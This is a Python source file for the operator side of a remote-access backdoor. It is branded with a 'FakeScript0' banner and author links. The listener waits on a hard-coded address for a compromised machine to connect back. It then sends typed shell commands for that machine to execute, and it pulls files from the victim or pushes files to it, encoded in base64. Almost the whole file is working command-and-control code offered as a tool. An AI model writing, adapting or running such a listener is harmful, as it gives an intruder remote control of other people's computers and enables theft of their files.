import simplejson
import base64
import socket
import subprocess
from colored import fg
class Listener():
	def __init__(self,ip,port):
		listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		listener.bind((ip,port))
		listener.listen(0)
		subprocess.call(["clear"])
		print(fg("red")+"""
	 _____     _        ____            _       _    ___  
	|  ___|_ _| | _____/ ___|  ___ _ __(_)_ __ | |_ / _ \ 
	| |_ / _` | |/ / _ \___ \ / __| '__| | '_ \| __| | | |
	|  _| (_| |   <  __/___) | (__| |  | | |_) | |_| |_| |
	|_|  \__,_|_|\_\___|____/ \___|_|  |_| .__/ \__|\___/ 
			                     |_|              
		""")
		print(fg("white")+"----------------------------------------------------------------------")
		print(fg("yellow")+"""
		
      Github: """+fg("white")+"  https://github.com/FakeScript0")
		print(fg("green")+"""      Linkedin: """+fg("white")+"""https://www.linkedin.com/in/nicat-abbasli-872016261/

""")		
		print(fg("white")+"----------------------------------------------------------------------")
		print(fg("blue")+"Listening Is Started!")
		print(fg("cyan")+"[!]"+fg("yellow")+"Pending ...")
		(self.connection,my_addres)=listener.accept()
		print(fg("yellow")+"[!] Connection From: "+str(my_addres)+" is Okay!"+fg("white"))
	def json_send(self,data):
		json_data=simplejson.dumps(data)
		self.connection.send(json_data.encode("utf-8"))
	def json_recv(self):
		json_data=""
		while True:
			try:
				json_data=json_data+self.connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue
	def command_exe(self,command_in):
		self.json_send(command_in)
		if command_in[0]=="quit":
			self.connection.close()
			exit()
		return self.json_recv()
	def download_command(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
		return (fg("green")+"[+] Download File: "+path+" Is Completed Successfuly!"+fg("white"))
	def upload_command(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())
	def execute_listener(self):
		while True:
			
			command_in=input(fg("blue")+"[=] Enter The Command: "+fg("white"))
			command_in=command_in.split(" ")
			try:
				if command_in[0]=="upload":
					file_content=self.upload_command(command_in[1])
					command_in.append(file_content)
				command_out=self.command_exe(command_in)
				if command_in[0]=="download":
					command_out=self.download_command(command_in[1],command_out)
			except Exception:
				command_out=fg("red")+"Error"+fg("white")
			print(command_out)
listener=Listener("192.168.31.158",8080)
listener.execute_listener()
